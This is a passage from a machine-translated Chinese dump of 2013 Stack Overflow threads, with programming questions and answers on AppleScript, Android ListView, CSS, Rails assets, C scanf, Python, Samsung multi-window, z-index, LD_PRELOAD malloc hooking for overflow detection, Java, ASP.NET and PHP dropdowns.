        e.printStackTrace();
    }

 }
} 
```

欢迎其他最佳实践...

# dictionary - 带有远程桌面的 AppleScript

> ID：14111031
> 
> 赞同：0
> 
> 时间：2013-01-01T13:51:35.570
> 
> 标签：dictionary, applescript, ip-address, remote-desktop

我对 AppleScript 比较陌生，但我的主要目标是获取名称和 IP 地址并通过 AppleScript 添加到 Apple Remote Desktop。我已经查过字典了，但是太新了，我还不明白字典..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T01:27:24.523

我没有远程桌面，但我们在 OSX 中都有“屏幕共享”。使用它打开与另一台计算机的连接非常简单。例如，我的计算机的共享名称是“mbPro”，因此这将在屏幕共享中打开该连接。远程桌面可能具有相同的命令。祝你好运。

```
tell application "Screen Sharing"
    GetURL "vnc://mbPro.local"
end tell 
```

# android - android ListView 项目点击闪烁的bug

> ID：14111032
> 
> 赞同：3
> 
> 时间：2013-01-01T13:51:42.860
> 
> 标签：android, listview, actionbarsherlock, android-holo-everywhere

我的问题：当我单击 ListViews 的项目时，它会按以下顺序更改其状态：如果未选中 - 未选中、已选中、未选中、已选中，而我希望它只是被选中而没有任何闪烁和闪烁

如果选中：选中 - 未选中（没问题）

此错误**仅出现在预 HoneyComb**设备上，在 ICS 上一切正常

我认为这个错误是指 Android 的内置机制。如果是这样，有什么解决办法吗？

我有的 ：

1) 列表视图 ( `multiChoice = true`)
2) 选择器：

```
 <item  android:drawable="@color/main_listview_item_pressed_longpressed"
        android:state_pressed="true" />

    <item  android:drawable="@color/main_listview_item_pressed_longpressed"
         android:state_checked="true"  /> 
```

应用于 ListViews 的项目布局

3）项目布局：

```
<com.sasha.medclock2.CheckedLinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical"
        android:paddingLeft="5dip"
        android:background="@drawable/list_item_selector"

        android:id="@+id/linerar_layout_checkable"
         >

        <TextView
            android:id="@+id/text1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@drawable/textview_selector"
             />

        <TextView
            android:id="@+id/text2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@drawable/textview_selector"
             />

        <TextView
            android:id="@+id/text3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@drawable/textview_selector"
             />

        <TextView
            android:id="@+id/text4"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@drawable/textview_selector"
             />

    </com.sasha.medclock2.CheckedLinearLayout> 
```

4）检查线性布局：

```
public class CheckedLinearLayout extends LinearLayout implements Checkable {
    private final static String TAG = "CheckableLinearLayout";

    private static final int[] CHECKED_STATE_SET = {
        android.R.attr.state_checked
    };

    private boolean checked = false;

    public CheckedLinearLayout(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public CheckedLinearLayout(Context context) {
        super(context);
    }

    @Override
    public boolean isChecked() {
        return checked;
    }

    @Override
    public void setChecked(boolean checked) {
        this.checked = checked;

        refreshDrawableState();

        //Propagate to childs
        final int count = getChildCount();
        for (int i = 0; i < count; i++) {
            final View child = getChildAt(i);
            if(child instanceof Checkable) {
                ((Checkable)child).setChecked(checked);
            }
        }
    }

    @Override
    protected int[] onCreateDrawableState(int extraSpace) {
        final int[] drawableState = super.onCreateDrawableState(extraSpace + 1);
        if (isChecked()) {
            mergeDrawableStates(drawableState, CHECKED_STATE_SET);
        }
        return drawableState;
    }

    @Override
    public void toggle() {
        this.checked = !this.checked;
    }
} 
```

5）我正在使用`ActionBarSherlock`lib 以及`HoloEverywhere`

6) 我用 ListView.setItemChecked(...) 检查 ListViews 的项目

非常感谢您的帮助，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T19:36:14.097

根据我的经验 ListView 回收项目。您的 listAdapter 应该保留已检查项目的列表并在那里设置检查：

```
public View getView(int position, View convertView, ViewGroup parent) {
    View view = convertView;

    if (view == null) {
        LayoutInflater layoutInflater = context.getLayoutInflater();
        view = layoutInflater.inflate(R.layout.alerts_list_line, null);
    }

    CheckBox cb = (CheckBox) view.findViewById(R.id.cb_list_line);
    cb.setTag(id);

    List<String> list = .getFavoriteId();

    if (list .contains(String.valueOf(info.getId())))
        cb.setChecked(true);
    else
        cb.setChecked(false);
    return view;
} 
```

# css - 特定边框的边框图像

> ID：14111042
> 
> 赞同：4
> 
> 时间：2013-01-01T13:52:52.280
> 
> 标签：css

我使用 CSS 创建了一个三角形，效果很好。现在我想使用图像而不是颜色作为边框，但它不起作用。我只想要边框图像`border-top`。
**这是原始的CSS：**

```
.triangle-down
{
    position:absolute;
    width: 0;
    height: 0;
    border-left: 87px solid transparent;
    border-right: 87px solid transparent;
    border-top: 150px solid #14A2E0;

} 
```

**修改 CSS 以使用图像：**

```
.triangle-down
{
    position:absolute;
    width: 0;
    height: 0;
    border-left: 87px solid transparent;
    border-right: 87px solid transparent;
    border-top: 150px solid;
    -moz-border-image:url(border.png) 30 30 round; /* Old Firefox */
    -webkit-border-image:url(border.png) 30 30 round; /* Safari */
    -o-border-image:url(border.png) 30 30 round; /* Opera */
    border-image:url(border.png) 30 30 round;   
} 
```

JSFiddle：http: [//jsfiddle.net/MnPLh/](http://jsfiddle.net/MnPLh/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:12:22.310

这或多或少会得到你想要的。长话短说，透明不适用于边框。您需要叠加 2 个 css 元素。[http://jsfiddle.net/harendra/TfV8K/](http://jsfiddle.net/harendra/TfV8K/)

```
.triangle-down
{
    position:absolute;
    width: 0;
    height: 0;
    border-left: 87px solid white;
    border-right: 87px solid white;
    border-top: 150px solid transparent;
    margin-top:153px;

}

.triangle-down1
{
    top:150px;
    position:absolute;
    width: 0;
    height: 0;
    border-image:url(http://jsfiddle.net/img/top-bg.png) 30 30 round;
    -moz-border-image:url(border.png) 30 30 round; /* Old Firefox */
   -webkit-border-image:url(border.png) 30 30 round; /* Safari */
   -o-border-image:url(border.png) 30 30 round; /* Opera */ 
    border-left: 87px solid transparent;
    border-right: 87px solid transparent;
    border-top: 150px solid transparent;  
}​

<div class='triangle-down1'></div>
<div class='triangle-down'></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-10T14:19:59.790

基本上，使基于 CSS 的三角形使用border-image 属性并实际获得预期外观的技巧似乎主要在于使用的图像。

我上次这样做时使用的 CSS 是这样的。

```
#pyramid{
    display:inline-block;
    border: 150px outset transparent;
    border-top:0px outset transparent;
    border-left:150px outset transparent;
    border-right:150px outset transparent;
    border-image: url("pyramid_border_image.png") 150 150 150 150 stretch stretch;
    overflow:visible;
    height  :1px;   width:1px;
    padding :0; margin:-1px;
    } 
```

我敢肯定这可能会变薄一些，但当时我只是想看看我是否能做到，但我可能会尽快重新审视它，因为我想要一个用于我的 css3 3d 东西的金字塔。

正如我所提到的，至少在我看来，这个技巧主要存在于图像中，特别是边框图像中左下角和右下角的角块。这些角本身需要让它们的正方形在三角形的两个底角的适当 45 度角处包含 1/2 透明和 1/2 图案。

有了正确制作的图像，之后就相当简单了。

# ruby-on-rails-3 - 破坏了我的资产管道

> ID：14111046
> 
> 赞同：1
> 
> 时间：2013-01-01T13:53:41.630
> 
> 标签：ruby-on-rails-3, asset-pipeline, assets

我查看了有关此主题的许多帖子，但似乎找不到解决我问题的组合。对不起，如果这是一个重复。

问题是我不确定我为达到这一点所采取的步骤顺序。

我在 Heroku 上的开发和生产中都有一个运行良好的 Rails 应用程序。但是，在 Heroku 部署中，我在资产预编译期间遇到了错误。因此，我更改了设置，因此 Heroku 会假设 'rake asset:precompile' 在部署之前已在本地运行。摆脱了部署错误，没问题。我现在不得不在本地预编译并将文件包含在我的 Git 存储库中，这有点烦人，但我喜欢无错误部署。

无论如何，现在正在开发中，对 CSS 的更改并没有即时反映。我必须运行“rake assets:precompile”。那不好。发现删除公共/资产可以解决该问题的帖子，它确实做到了。

现在 Javascript/Coffeescript 更改不会即时反映。

对不起，冗长的描述。

理想情况下，我会进入一个在开发中即时反映变化的世界，我不需要在 Heroku 部署之前运行“rake assets:precompile”，并且在 Heroku 上预编译期间不会出现错误.

不太理想的是，我会回到我最初的行为（Heroku 在部署时抱怨，但一切仍然正常）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:29:33.993

如果您想即时预编译资产，请使用（例如`config/production.erb`）

```
config.assets.compile = true
config.assets.precompile << '*.js' 
```

然后查看`config/application.rb`那里，您可以选择是否要在部署到生产之前进行预编译

```
if defined?(Bundler)
  # If you precompile assets before deploying to production, use this line
  Bundler.require(*Rails.groups(:assets => %w(development test)))
  # If you want your assets lazily compiled in production, use this line
  # Bundler.require(:default, :assets, Rails.env)
end 
```

# c - C语言编译程序崩溃

> ID：14111050
> 
> 赞同：-2
> 
> 时间：2013-01-01T13:54:02.720
> 
> 标签：c

我有一个程序，旨在将 10 个整数从一个数组复制到另一个数组。它正在编译，没有任何错误。它如下： -

```
/* Program to copy a string from one array to another array and print the second array */
#include<stdio.h>
#include<conio.h>
#define MAX 10
void main()
{
    int s[MAX]; // Original array
    int c[MAX]; // Array which contains the copied contents of s[MAX]
    int i;
    printf("Enter the string of 10 characters");
    for(i=0;i<MAX;i++)  // Storing elements in the original array
    {
        scanf("%d",s[i]);
    }
    for(i=0;i<MAX;i++)
    {
        printf("%d",s[i]);
    }
    printf("\n");
    for(i=0;i<MAX;i++)  /*Copying the elements from the original array into the duplicate array*/
    {
        c[i]=s[i];
    }
    for(i=0;i<MAX;i++) //Printing the duplicate array
    {
        printf("%d",c[i]);
    }
} 
```

它甚至没有打印原始数组。更不用说重复数组了，这是程序的后半部分。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T13:55:54.740

这`scanf("%d",s[i]);`应该读`scanf("%d",&s[i]);`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-01T13:56:25.820

你忘`&`了`scanf`。代码应该是：`scanf("%d",&s[i]);`. 为什么？您只需为函数提供应更改值的变量的地址。如果没有指针，函数将无法更改值。

例子：

```
int function1(int a) {
    a = 10;
}

int function2(int* a) {
    *a = 20;
}

(...)
int a = 5;
function1(a);
printf("%d\n", a); /* a is still 5 */
function2(&a);
printf("%d\n", a); /* a is now 20 */ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-01T13:57:14.380

您应该`&`在`scanf`

```
scanf("%d",&s[i]); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-01T14:13:54.027

该函数`scanf`需要一个指向整数的指针作为参数。由于`s[i]`返回数组 s 中索引 i 处的整数值而不是指向它的指针，因此`scanf`尝试将扫描的值存储到导致程序崩溃的无效内存位置。

改为使用`&s[i]`以提供`scanf`指针。

# python - 比较不同类型的python中的字符串

> ID：14111051
> 
> 赞同：0
> 
> 时间：2013-01-01T13:54:09.263
> 
> 标签：python

我通过以下方式获得两个包含整数值的字符串。我已经尝试了所有选项，但结果总是 False。

```
 string1    = element.__dict__.get('layer')    # '7'

    temp_string2,temp_string3=temp_key.split(':') # temp_key = '7:12'

    if string1 == temp_string2:
          print "data found" 
```

尽管两者都包含相同的值，但我没有得到 True 。我可以对此发表一些意见吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:12:34.373

`element.layer`是一个`int`，不是一个`string`。这就是为什么`repr(string1)`会返回`7`而不是`'7'`。你应该试试

```
string1` = str(element.layer) 
```

同时请注意，您不应`__dict__`直接通过符号访问对象属性，而应使用`.`符号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:13:43.797

根据我在评论流中看到的

> 您能否将 print repr(string1), repr(temp_string2) 添加到您的代码中以向我们展示变量包含的内容？
> 
> 我得到了 7 和“7”。我将如何解决这个问题。为什么会有这种差异。我明白在这两种情况下它都是字符串

很明显，您正在将整数与字符串进行比较。

if `print repr(string1)`, 返回`7`并`print repr(temp_string2)`返回`"7"`then `string1`，即

```
string1    = element.__dict__.get('layer') 
```

应该是一个整数

所以你必须在比较之前转换`string1`为`integer`

```
if str(string1) == temp_string2:
     print "data found" 
```

或从字典中检索值后将其转换为字符串

```
string1 = str(element.__dict__.get('layer')) 
```

奇怪的是，它是访问 dict 的 get 方法的一种非常非常规的方式，而不是您可以简单地使用`.`符号进行成员引用

```
string1    = element.get('layer') 
```

# android - 将三星多窗口支持添加到 Android 应用程序

> ID：14111052
> 
> 赞同：26
> 
> 时间：2013-01-01T13:54:10.180
> 
> 标签：android, samsung-mobile, multi-window

我去尝试按照此[链接](http://www.modaco.com/page/news/_/android/developers-add-support-for-samsung-multi-window-to-your-apps-r823)添加三星对我的应用程序的多窗口支持。我的应用程序确实出现在三星的多窗口应用程序选项卡中，并且我能够将其拖放到屏幕中，但是我的应用程序并没有像支持多窗口的应用程序那样运行，而是扩展到全屏。

我认为需要进行一些其他更改才能使其正常工作，但我不知道是什么。有谁知道导致这种行为的问题可能是什么？

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2013-01-06T18:39:17.007

[这个 xda-developers 论坛帖子](http://forum.xda-developers.com/showthread.php?t=1985240)包含一个分步指南，我在这里解释过。

`<application>`确保您的清单在标签内的某处包含以下内容：

```
<uses-library android:required="false" android:name="com.sec.android.app.multiwindow" />
<meta-data android:name="com.sec.android.support.multiwindow" android:value="true" />
<meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W" android:resource="@dimen/app_defaultsize_w" />
<meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H" android:resource="@dimen/app_defaultsize_h" />
<meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W" android:resource="@dimen/app_minimumsize_w" />
<meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H" android:resource="@dimen/app_minimumsize_h" /> 
```

对于所需的活动，添加到其`<intent-filter>`标签：

```
<category android:name="android.intent.category.MULTIWINDOW_LAUNCHER" /> 
```

请务必在资源文件中定义上述尺寸。

在该博客文章的评论部分，一位用户提到最小尺寸给他带来了问题，并建议删除`com.sec.android.multiwindow.MINIMUM_SIZE_W`和`com.sec.android.multiwindow.MINIMUM_SIZE_H`。

[一位用户指出](http://www.modaco.com/page/news/_/android/developers-add-support-for-samsung-multi-window-to-your-apps-r823#comment_2068483)，通过维度资源指定维度对他不起作用；他改为硬编码 value 属性：

```
<uses-library android:required="false" android:name="com.sec.android.app.multiwindow" />
<meta-data android:name="com.sec.android.support.multiwindow" android:value="true" />
<meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W" android:value="632.0dip" />
<meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H" android:value="598.0dip" />
<meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W" android:value="632.0dip" />
<meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H" android:value="598.0dip" /> 
```

恐怕我无法尝试自己，因为我没有 Galaxy Note。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-29T01:19:18.670

在 Galaxy Note 3 上测试我的应用程序后，我发现了另外两件事：

`MINIMUM_SIZE`并且`DEFAULT_SIZE`仅适用于三星平板电脑的 MultiWindow，不适用于智能手机。

此外，如果您想在您的应用程序中启用多实例，请将此行添加到您的 AndroidManifest：

```
<meta-data
            android:name="com.samsung.android.sdk.multiwindow.multiinstance.enable"
            android:value="true" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-14T06:22:19.617

另外值得注意的是为您的应用程序启用 Pen Window（多窗口系统的一部分），以及此处所述的 Multi-Window 和 Multi-Instance ( [http://forum.xda-developers.com/showthread.php?t =2499720](http://forum.xda-developers.com/showthread.php?t=2499720) ):

```
<meta-data android:name="com.samsung.android.sdk.multiwindow.penwindow.enable" android:value="true" /> 
```

并将启动器代码添加到您的活动中：

```
<category android:name="android.intent.category.PENWINDOW_LAUNCHER" /> 
```

作为启动器代码的注释，xda 帖子列出了它并带有`com.samsung`前缀，但我无法让它在我的 N3 上工作，如那里所述（我使用了上面的修改代码）。在 Pen Window 中，您必须点击编辑并将您的应用程序从底部拖到 Pen Window Launcher 屏幕中，然后才能使用它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-10T13:23:08.637

要在 Android 7 及更高版本上支持多窗口，只需在清单的“活动”或“应用程序”元素中将此 android:resizeableActivity 设置为 true：

```
android:resizeableActivity="true" 
```

[https://developer.android.com/guide/topics/ui/multi-window.html](https://developer.android.com/guide/topics/ui/multi-window.html)

# css-float - div z 索引不起作用

> ID：14111053
> 
> 赞同：0
> 
> 时间：2013-01-01T13:54:12.737
> 
> 标签：css-float, z-index, transparent, css-position

我在主页上有一个弹出式咖啡幻灯片 - [theCoffeeLocator.com](http://thecoffeelocator.com)（单击“优势”打开幻灯片。

打开时，幻灯片以半透明的方式使网页的其余部分变暗。我的顶部导航栏 div (id="topstrip") 不会位于变暗的 div (id="jdarken") 后面。

任何想法谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:31:45.530

( `#topstrip`z-index: 995) 放置在`#header`(z-index: 994) 内`#back`。

( `#jdarken`z-index: 996) 放置在`#contentarea`(z-index: 1) 内`#back`。

因为`994>1`，所有的孩子都`#header`将被绘制在所有的孩子之上`#contentarea`。与`#jdarken`处于不同的堆叠上下文（由 DOM 树中的 z 索引节点分隔）中`#topstrip`，它们的相对 z 索引无关紧要。

作为解决方案，*我建议从`#contentarea`*. 这将放置`#jdarken`在与 相同的堆栈上下文中`#header`，因此`#jdarken`将堆栈在`#header`（和之上`#topstrip`）之上，因为`996 > 994`. 如果我理解正确，z-index`#topstrip`也未使用，您可以删除该属性而不会产生任何后果。

同样正确的是，必须对元素进行`position`编辑才能使 z-index 起作用（`fixed`将做）；但是，这里满足这个条件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T13:55:41.177

为了使 z-index 属性起作用，元素应该有一个相对的、绝对的或固定的位置属性。

当我检查你的源代码时，我注意到你的灰色元素位于其他一些元素中，z-index 行为受父母属性的影响，

尝试将您的 id="jdarken" div 重新定位到页面底部，然后尝试。

# c - LD_PRELOADed 库和子进程

> ID：14111056
> 
> 赞同：5
> 
> 时间：2013-01-01T13:54:52.393
> 
> 标签：c, linux, process, fork, ld-preload

每个人！

我有这样的程序（usemalloc）的图像：

```
#include <stdio.h>
#include <stdlib.h>

#define USER_BYTES_SIZE 100

int main(void){
    char* userbytes = (char*)malloc(USER_BYTES_SIZE*sizeof(char));
    if(!userbytes)
        return 1;

    for(int i = 0; i <= USER_BYTES_SIZE; i++){ // "i <= USER_BYTES_SIZE" leads to an off-by-one memory overrun.
        userbytes[i] = 0;
    }
    return 0;
} 
```

如您所见，存在一个导致内存溢出的错误。我想在运行时检测此类错误。LD_PRELOADed 库适合我的工作。我制作了一个名为 libhijack.so 的库来劫持对真正 malloc 的调用，并将其替换为对我自己的自定义 malloc 的调用，该调用调用真正的 malloc 并在由真正的 malloc 分配的内存条的末端添加红色区域。libhijack.so 的代码如下：

```
void* (*real_malloc) (size_t size);
void* malloc(size_t size){
    real_malloc = ((void*)(*)(size_t))dlsym(RTLD_NEXT, "malloc");
    void* allocbytes = (void*)real_malloc(size + 4); //put 2 bytes at each end, call them red zones
    return (allocbytes + 2);
} 
```

我使用以下命令运行带有库的主程序：

```
LD_PRELOAD=./libhijack.so ./usemalloc 
```

然后如果有红色区域的内存访问，我会检测它们并将它们视为内存溢出错误。

当主进程包含对 malloc 的调用时，此 LD_PRELOAD 解决方案运行良好，但在分叉子进程执行此操作时失败。

例如，我们将“usemalloc”改成如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // +

#define USER_BYTES_SIZE 100

int main(void){
    pid_t child = fork();
    if(child < 0)
        exit(1);

    if(child == 0){ //child process
        char* userbytes = (char*)malloc(USER_BYTES_SIZE*sizeof(char));
        if(!userbytes)
            return 1;

        for(int i = 0; i <= USER_BYTES_SIZE; i++){ // "i <= USER_BYTES_SIZE" leads to an off-by-one memory overrun.
            userbytes[i] = 0;
        }
    }
    else { //the current process
        wait(NULL);
    }
    return 0;
} 
```

LD_PRELOADed 库不会检测到子进程中发生的溢出错误。

所以我的问题是：如何使用 LD_PRELOADed 库检测子进程中的溢出错误？那（使用 LD_PRELOADed 库）可能吗？如果没有，还有其他选择吗？任何建议表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T09:56:02.437

使用 valgrind 检测内存泄漏和其他内存问题。它工作得很好，你不必实现任何东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:44:09.623

我希望通过指出 libhijack 代码实际上并没有分配任何内存，我不会挑剔？pthread_mutex_lock 需要一个 pthread_mutex_t * 参数，并返回一个整数，表示互斥锁是否成功？

此外，您正在 fork() 一个子进程，这与创建线程有点不同，因此 pthread 函数可能不是您真正想要的......？

另一个技巧是，虽然已经演示了导致问题的代码，但您如何检查“红色区域”？也许检测怪癖在于检测代码？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-30T22:14:48.363

我认为您的问题与`fork()`vs.没有任何关系`LD_PRELOAD`。我认为这可能是您代码中其他地方的错误。我尝试使用以下测试用例重现您的问题：

```
// preloadlib.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
void* malloc(size_t size)
{
        write(1, "malloc\n", 7);
        void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
        return real_malloc(size);
} 
```

.

```
// example.c
#include <unistd.h>
#include <stdlib.h>
int main()
{
        if (fork()) {
                write(1, "A\n", 2);
                malloc(1337);
                write(1, "B\n", 2);
        } else {
                write(1, "C\n", 2);
                malloc(1337);
                write(1, "D\n", 2);
        }
        return 0;
} 
```

.

```
# run.sh
gcc -Wall -Wextra -o example example.c
gcc -Wall -Wextra -fPIC -o preloadlib.so -shared preloadlib.c -ldl
LD_PRELOAD=$PWD/preloadlib.so ./example 
```

这是我得到的输出：

```
$ bash run.sh 
A
malloc
C
B
malloc
D 
```

这是在 64 位 Kubuntu 12.04（libc 版本 2.15-0ubuntu10.4）上。

# java - 如何防止重名？

> ID：14111062
> 
> 赞同：-3
> 
> 时间：2013-01-01T13:55:47.170
> 
> 标签：java, spring-mvc

任何人都可以解释如何停止重复名称。如果给出任何重复名称，那么我需要显示适当的错误消息，例如“名称已存在”。所以应用程序包含以下类 Merchant.java、MerchantDao.java、MerchantImpl.java 类。所以我需要在 MerchantImpl.java 类中实现方法，该方法包含停止重复商家名称的逻辑。

```
Merchat.java

public class Merchant
 {
 private String merchant Name;
etc
 } 

 MerchantImpl.java
  public class MerchantImpl
  {
need to define a method to prevent duplicate names;
     } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:02:18.833

您可以覆盖 Merchant 类的 hashCode 和 equals 方法

```
@Override
public int hashCode() {
    return name.hashCode();
}

@Override
// This really depends on if you want to compare only objects or names too.
// The following compares names too.
public boolean equals(final Object obj) {
    if (this == obj)
        return true;
    if (obj == null)
        return false;
    if (getClass() != obj.getClass())
        return false;
    final Merchant other = (Merchant) obj;
    if (name == null) {
        if (other.name != null)
            return false;
    } else if (!name.equals(other.name))
        return false;
    return true;
} 
```

然后，将 Merchant 对象存储在 Set 集合中（以便更快地查找）。添加适当的检查以查看集合中是否已存在新商家的名称。

```
Set<Merchant> merchants = new HashSet<>()
// Populated the merchants 
```

现在检查

```
// if merchant names are unique
merchants.contains(newMerchantObj) 
```

PS：我只建议用商家名称的哈希码覆盖哈希码，因为您需要为商家维护唯一的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:01:03.907

将所有名称保存在集合中，并在给出新名称时检查该名称是否已经在集合中。代码可能看起来像这样（您可能不需要新类）：

```
class NameChecker {
    Set<String> names = new HashSet<String>();

    public void addName(String name) {
        if (names.contains(name)) {
            //print message
        } else {
            names.add(name);
            // do what you have to with new names.
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:01:33.873

将名称存储在集合中。不幸的是，您没有提供显示如何获得新名称的代码，但以下代码示例应该对您有所帮助：

// 定义 Set names = new HashSet();

// 代码中获得新名称的其他位置： if (names.contains(name)) { // 打印错误消息 } names.add(name); // 添加新名称。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:04:21.943

如果存在，则在数据库中搜索输入名称，然后在数据库中插入错误。

```
if(name exist in database)
error
else 
add name in database. 
```

实际代码取决于您用于维护数据库的数据结构。

```
if(name_list.contains(name))
error
else 
name_list.add(name); 
```

# asp.net - 使用 requiredfieldvalidator 的控制台错误

> ID：14111065
> 
> 赞同：0
> 
> 时间：2013-01-01T13:56:04.580
> 
> 标签：asp.net, requiredfieldvalidator

我在我的网页的控制台中收到此错误。

```
GET http://localhost:49767/EnerTeckWebsite_December2012/(S(v1qkix21cbp21r2qbuzlp1hv))/Scripts/jquery-1.8.1.js 404 (Not Found) 
```

奇怪的是，a) 我在我的 jquery 中使用谷歌 CDN，我的脚本文件夹中有 1.8.2 而不是 1.8.1。因此，我从页面中删除了所有内容，并一一添加了内容。asp:RequiredFieldValidator 是导致控制台出现此错误的原因。该控件是否要求 jquery 1.8.1？

我使用的标记如下

```
<div id="addnewcontact" class="visible">
    <fieldset style="width:70%;">
        <legend>Add New Contact Form</legend>
        <asp:panel runat="server" ID="custform" cssclass="contactform">
        <%--FirstName--%>
            <asp:Label ID="lblFirstname"  AssociatedControlID="firstname" Text="First Name:" runat="server"></asp:Label>
            <asp:TextBox ID="firstname"  runat="server" CssClass="textboxes placeholder" Text=""
                         TabIndex="1" Tooltip="Enter your first name here" Width="250" BackColor="#CCFFCC"></asp:TextBox>
            <asp:RequiredFieldValidator ID="rfvFirstName" runat="server" ErrorMessage="[Required]"
                            ControlToValidate="firstname" CssClass="validation-summary-errors">
            </asp:RequiredFieldValidator>&nbsp;&nbsp;

            <br /><p class="spacer"></p>
            <asp:Button ID="submit" runat="server" Text="Submit" CssClass="buttons" />
        </asp:panel> <%--end of custform panel--%>
    </fieldset>
</div> 
```

谁能解释为什么a）它正在寻找一个我什至没有引用的jquery版本和b）RequriedFieldValidator的工作方式有什么特殊之处吗？

这是呈现的 html，不知何故有一个脚本引用进入 1.8.1

```
<script src="/EnerTeckWebsite_December2012/WebResource.axd?d=pynGkmcFUV13He1Qd6_TZEhw5ogJwHMaGvv1faj0ohidrhqfoYJwjxtK8gBUdHUYC2f9QooQdJrQd8gPrks-mg2&amp;t=634773918900000000" type="text/javascript"></script>

<script src="/EnerTeckWebsite_December2012/Scripts/jquery-1.8.1.js" type="text/javascript"></script>
<script src="/EnerTeckWebsite_December2012/WebResource.axd?d=x2nkrMJGXkMELz33nwnakJlfi53iisy1dQO0tCbSRSWSLiZnFT5LN-XRQqeUoK_7idgcf-wX-V5IQv2Vbycn_GyYa4xZktCNxaI6T1wfZgA1&amp;t=634773918900000000" type="text/javascript"></script> 
```

但谷歌 CDN 已经在页面更早的位置调用 jquery。

编辑：我删除了更新面板和脚本管理器。他们没有调用 1.8.1，因为该标签不在页面上，并且当 requiredfieldvalidator 设置为 false 时没有错误，但是当我将其设置回 true 时，错误就在那里。不知何故，该控件专门要求 1.8.1 这是 AJAX 问题吗？任何帮助，将不胜感激。

想法？使用 html5 文本框是否需要正则表达式验证器，您可以在其中设置类型，即 type=email

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T20:16:50.873

您可以注释掉该页面上的所有内容并加载它吗？如果 1.8.1 引用仍然存在，我敢打赌它来自`MasterPage`该页面上的任何子控件，而不是任何子控件。

# php - 在从 mysql 表中检索到的下拉列表中显示正确的值

> ID：14111066
> 
> 赞同：1
> 
> 时间：2013-01-01T13:56:06.903
> 
> 标签：php, html

我有一个下拉列表，它应该显示从 mysql 表中检索到的记录的正确值。以下是我迄今为止尝试过的：

```
 <strong>Authority Id: *</stong><select name="authid">
   <?php

            $authid = $row['AuthorityId'];
    $selectedId = array(
    5, 6, 7);
    $selection = array(
            5 => "Admin",
            6 => "Employee",
            7 => "Student" );
    foreach($selection as $value){
        $text = $value;
        echo '<option value="'.$selectedId.'" selected="'.$authid.'">'.$text.'</option>';
    }
  ?>
  </select> 
```

但它没有显示正确的值。有人可以帮我弄清楚这里出了什么问题吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:02:41.827

```
<strong>Authority Id: *</strong><select name="authid">
<?php

$authid = $row['AuthorityId']; // Get $authid from database
$selection = array( // Create Index Of AuthIDs and AuthNames
    5 => "Admin",
    6 => "Employee",
    7 => "Student" );

foreach($selection as $key => $value) // Loop Through $selection, Where $key is AuthID and $value is AuthName
{
    echo '<option value="' . $key . '"'; // Start Menu Item
    if ($authid == $key) // Check If AuthID from $selection equals $authid from database
        echo ' selected="selected"'; // Select The Menu Item If They Match
    echo '>' . $value . '</option>'; // End Menu Item
}
?>
</select> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:05:11.437

**更新**： criptic 提供的[答案](https://stackoverflow.com/a/14111114/66482)更好 - selected 属性的存在似乎足以在某些浏览器中选择一个选项 -[有关更多详细信息，请参阅此问题的答案](https://stackoverflow.com/questions/1033944/what-values-can-appear-in-the-selected-attribute-of-the-option-tag)。

* * *

您`selected`错误地使用了选项标签的属性：

```
<strong>Authority Id: *</stong><select name="authid">
<?php
 $authid = $row['AuthorityId'];

 $selectedId = array(5, 6, 7);
 $selection = array(
        5 => "Admin",
        6 => "Employee",
        7 => "Student" );

 foreach($selection as $value){
    $text = $value;
    $selected = '';
    if ($selectedID == $authid) {
        $selected = 'selected';
    }
    echo '<option value="'.$selectedId.'" selected="'.$selected.'">'.$text.'</option>';
 }
?>
</select> 
```

